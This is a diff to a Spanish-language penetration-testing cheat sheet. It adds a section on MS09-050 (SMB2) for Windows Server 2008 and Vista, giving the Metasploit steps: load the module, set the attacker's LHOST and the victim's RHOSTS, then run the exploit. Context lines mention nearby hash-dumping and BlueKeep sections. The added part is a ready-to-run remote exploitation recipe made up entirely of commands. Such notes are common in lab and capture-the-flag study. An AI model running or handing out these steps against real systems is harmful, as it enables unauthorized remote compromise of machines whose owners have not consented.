@@ -219,6 +219,22 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 	❯ exploit 
 ```
 
+## MS09-050 Windows Server 2008 SP1 (SMB)
+
+```bash 
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+	❯ options
+	❯ set LHOST ❮IP❯                               # Colocamos la IP de nuestra maquina 
+	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
+	❯ exploit 
+	
+
+NOTA:
+	- Exploit target: Windows Vista SP1/SP2 and Server 2008 (x86)
+```
+
 ## Puerto 3389 BlueKeep
 
 * Servicio 'ms-wbt-server'
